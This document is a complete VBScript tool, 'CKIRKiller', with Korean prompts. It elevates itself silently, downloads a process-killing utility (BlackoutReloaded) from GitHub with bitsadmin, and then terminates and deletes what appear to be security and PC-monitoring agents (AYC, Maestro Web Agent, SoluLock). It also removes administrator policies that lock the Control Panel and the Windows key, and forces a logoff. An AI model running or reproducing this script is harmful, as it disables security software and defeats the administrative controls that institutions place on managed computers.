' ============================================================
'   CKIRKiller - User-Centric VBScript Edition (ISE Bypass)
'   Optimized UX / Minimized Popups / Friendly Tone
' ============================================================

Option Explicit

Dim oShell, oFSO, oWMI, oReg
Set oShell = CreateObject("WScript.Shell")
Set oFSO   = CreateObject("Scripting.FileSystemObject")
Set oWMI   = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
Set oReg   = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")

Const HKEY_CURRENT_USER  = &H80000001
Const HKEY_LOCAL_MACHINE = &H80000002

Const GitPath      = "C:\Program Files\Git"
Const BlackoutExe = "C:\Program Files\Git\BlackoutReloaded.exe"
Const GitInstaller= "C:\Windows\Temp\Git-Installer.exe"
Const BlackoutTmp = "C:\Windows\Temp\BlackoutReloaded.exe"
Const MaestroDir  = "C:\Program Files (x86)\Solusseum\MaestroWeb Agent"
Const GitURL      = "https://github.com/git-for-windows/git/releases/download/v2.53.0.windows.2/Git-2.53.0.2-64-bit.exe"
Const BlackoutURL = "https://github.com/tijme/blackout-reloaded/raw/master/BlackoutReloaded.exe"

' ── Admin check ─────────────────────────────────────────────
Dim sTestFile : sTestFile = "C:\Windows\System32\_admintest_.tmp"
Dim bAdmin : bAdmin = False
On Error Resume Next
Dim oTest : Set oTest = oFSO.CreateTextFile(sTestFile, True)
If Err.Number = 0 Then
    bAdmin = True
    oTest.Close
    oFSO.DeleteFile sTestFile, True
End If
On Error GoTo 0

If Not bAdmin Then
    Dim sScript : sScript = WScript.ScriptFullName
    oShell.Run "mshta vbscript:Execute(""CreateObject(""""Shell.Application"""").ShellExecute """"wscript.exe"""","""""""""  & sScript & """"""""",,""""runas"""",1:close"")", 0, False
    WScript.Quit
End If


' ── UX Step 1: Initial Prompt ───────────────────────────────
Dim nHancomRes
nHancomRes = MsgBox("한컴 입력기 제거도 같이 진행할까요?" & vbCrLf & _
                    "(메모장에 있는 코드를 복붙하는 귀찮음이 있습니다.)" & vbCrLf & vbCrLf & _
                    "진행하려면 '예(Y)', 건너뛰려면 '아니오(N)'를 눌러주세요.", _
                    vbYesNo + vbQuestion, "CKIRKiller 최적화")


' ── Core Processing (Silent & Automated) ────────────────────
' 1. Prerequisites Download (Runs in sequence as it's required for the next steps)
If Not oFSO.FileExists(GitPath & "\git-bash.exe") Then
    BitsDownload GitURL, GitInstaller
    oShell.Run """" & GitInstaller & """ /VERYSILENT /NORESTART /NOCANCEL /SP-", 0, True
End If

If Not oFSO.FileExists(BlackoutExe) Then
    BitsDownload BlackoutURL, BlackoutTmp
    On Error Resume Next
    oFSO.MoveFile BlackoutTmp, BlackoutExe
    On Error GoTo 0
End If

' 2. Kill Targets & Clean Maestro
BlackoutWithPath "qukapttp.exe"
BlackoutWithPath "nfowjxyfd.exe"
BlackoutWithPath "lqndauccd.exe"
BlackoutWithPath "rwtyijsa.exe"
BlackoutWithPath "nhfneczzm.exe"
BlackoutWithPath "AYCWSSrv.ayc"
BlackoutWithPath "AYCRTSrv.ayc"
BlackoutWithPath "AYIASrv.exe"
BlackoutWithPath "AYCUpdSrv.ayc"
BlackoutWithPath "AYCMain.ayc"
BlackoutWithPath "AYCAgent.ayc"
BlackoutWithPath "AYCRTSrv.exe"
BlackoutWithPath "AYIASrv.exe"
BlackoutWithPath "Yoondisk_hd_recv.exe"
BlackoutWithPath "yoondisk_chplayer.exe"
BlackoutAndDelete "MaestroWebSvr.exe"
BlackoutAndDelete "MaestroWebAgent.exe"
BlackoutAndDelete "SoluLock.exe"
If oFSO.FolderExists(MaestroDir) Then
    DeleteFolderContents MaestroDir
End If

' 3. Unlock Control Panel
Dim reginiPath : reginiPath = oFSO.GetSpecialFolder(2) & "\unlock_cp.ini"
Dim oTextStream
On Error Resume Next
Set oTextStream = oFSO.CreateTextFile(reginiPath, True)
oTextStream.WriteLine "\Registry\Machine\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer [1 5 7 17]"
oTextStream.Close
oShell.Run "regini.exe """ & reginiPath & """", 0, True
WScript.Sleep 500
oFSO.DeleteFile reginiPath, True
On Error GoTo 0

oReg.DeleteValue HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoControlPanel"
oReg.DeleteValue HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoSettingsPage"
oReg.DeleteValue HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoControlPanel"

' 4. Unlock Windows Key (Scancode Map)
oReg.DeleteValue HKEY_LOCAL_MACHINE, "SYSTEM\CurrentControlSet\Control\Keyboard Layout", "Scancode Map"

' 5. Restart Explorer Silently
KillProcessWMI "explorer.exe"
WScript.Sleep 1000
oShell.Run "explorer.exe", 0, False


' ── UX Step 2: Hancom Manual Assist (If Requested) ──────────
If nHancomRes = vbYes Then
    KillProcessWMI "HncUpdateTray.exe"
    KillProcessWMI "HncIME.exe"

    Dim psFixTxt : psFixTxt = oFSO.GetSpecialFolder(2) & "\HancomFix_Guide.txt"
    Dim oTxt
    Set oTxt = oFSO.CreateTextFile(psFixTxt, True)
    oTxt.WriteLine "=========================================================="
    oTxt.WriteLine " 한컴 입력기 수동 초기화 가이드"
    oTxt.WriteLine "=========================================================="
    oTxt.WriteLine ""
    oTxt.WriteLine "1. 아래 5줄의 영어 명령어를 마우스로 드래그해서 모두 복사(Ctrl+C)합니다."
    oTxt.WriteLine "2. 함께 열린 파란색 화면(PowerShell ISE) 아래쪽 입력창을 클릭합니다."
    oTxt.WriteLine "3. 복사한 명령어를 붙여넣고(Ctrl+V) 엔터(Enter)를 누릅니다."
    oTxt.WriteLine ""
    oTxt.WriteLine "▼ 여기서부터 복사하세요 ▼"
    oTxt.WriteLine "$UserLanguageList = New-WinUserLanguageList -Language ""ko-KR"""
    oTxt.WriteLine "Set-WinUserLanguageList -LanguageList $UserLanguageList -Force"
    oTxt.WriteLine "Stop-Process -Name ""ctfmon"" -Force -ErrorAction SilentlyContinue"
    oTxt.WriteLine "Remove-Item -Path ""HKCU:\Software\Microsoft\CTF\SortOrder"" -Recurse -Force -ErrorAction SilentlyContinue"
    oTxt.WriteLine "Start-Process ""ctfmon.exe"""
    oTxt.Close

    ' Open Notepad and ISE without blocking the script (WaitOnReturn = False)
    oShell.Run "notepad.exe """ & psFixTxt & """", 1, False
    On Error Resume Next
    oShell.Run "powershell_ise.exe", 1, False
    On Error GoTo 0
End If


' ── UX Step 3: Final Completion & Logoff Prompt ─────────────
Dim sLogoffMsg
sLogoffMsg = "모든 최적화 작업이 완료되었습니다!" & vbCrLf & vbCrLf & _
                 "제어판/Windows 키 해금을 적용하려면 로그아웃이 필요합니다. (데이터 안 날아감)" & vbCrLf & _
                 "필요하시다면 작업 중인 문서를 모두 저장하시고 '예(Y)'를 눌러 로그아웃하세요."


Dim nLogoffRes
nLogoffRes = MsgBox(sLogoffMsg, vbYesNo + vbInformation, "작업 완료")

If nLogoffRes = vbYes Then
    ' WMI Forced Logoff
    Dim colOS, objOS
    Set colOS = GetObject("winmgmts:{impersonationLevel=impersonate,(Shutdown)}!\\.\root\cimv2").ExecQuery("Select * from Win32_OperatingSystem")
    For Each objOS In colOS
        objOS.Win32Shutdown(4) ' Forced Logoff
    Next
End If

' Cleanup guide text
If oFSO.FileExists(psFixTxt) Then
    On Error Resume Next
    oFSO.DeleteFile psFixTxt, True
    On Error GoTo 0
End If

WScript.Quit


' ============================================================
'   Helpers 
' ============================================================

Sub KillProcessWMI(sExe)
    On Error Resume Next
    Dim oProcs, oProc
    Set oProcs = oWMI.ExecQuery("SELECT * FROM Win32_Process WHERE Name='" & sExe & "'")
    For Each oProc In oProcs
        oProc.Terminate()
    Next
    On Error GoTo 0
End Sub

Sub BitsDownload(sURL, sDest)
    On Error Resume Next
    oFSO.DeleteFile sDest, True
    oShell.Run "bitsadmin /transfer bloatdl /download /priority foreground """ & sURL & """ """ & sDest & """", 0, True
    On Error GoTo 0
End Sub

Sub BlackoutWithPath(sExe)
    On Error Resume Next
    Dim sFilePath : sFilePath = ""
    Dim oProcs, oProc
    Dim bRunning : bRunning = False
    
    Set oProcs = oWMI.ExecQuery("SELECT ExecutablePath FROM Win32_Process WHERE Name='" & sExe & "'")
    For Each oProc In oProcs
        bRunning = True
        If Not IsNull(oProc.ExecutablePath) Then sFilePath = oProc.ExecutablePath
    Next

    If bRunning Then
        KillProcessWMI sExe
        WScript.Sleep 300
        oShell.Run """" & BlackoutExe & """ " & sExe, 0, True
    End If

    If sFilePath <> "" Then oFSO.DeleteFile sFilePath, True
    On Error GoTo 0
End Sub

Sub BlackoutAndDelete(sExe)
    On Error Resume Next
    Dim sFilePath : sFilePath = MaestroDir & "\" & sExe
    Dim oProcs, oProc
    Dim bRunning : bRunning = False
    
    Set oProcs = oWMI.ExecQuery("SELECT ExecutablePath FROM Win32_Process WHERE Name='" & sExe & "'")
    For Each oProc In oProcs
        bRunning = True
        If Not IsNull(oProc.ExecutablePath) Then sFilePath = oProc.ExecutablePath
    Next

    If bRunning Then
        KillProcessWMI sExe
        oShell.Run """" & BlackoutExe & """ " & sExe, 0, True
        WScript.Sleep 50
    End If

    oFSO.DeleteFile sFilePath, True
    WScript.Sleep 200
    oFSO.DeleteFile sFilePath, True
    On Error GoTo 0
End Sub

Sub DeleteFolderContents(sPath)
    On Error Resume Next
    Dim oFolder : Set oFolder = oFSO.GetFolder(sPath)
    If Err.Number <> 0 Then Exit Sub 
    
    Dim oFile, oSub
    For Each oFile In oFolder.Files
        oFile.Delete True
    Next
    For Each oSub In oFolder.SubFolders
        oSub.Delete True
    Next
    On Error GoTo 0
End Sub
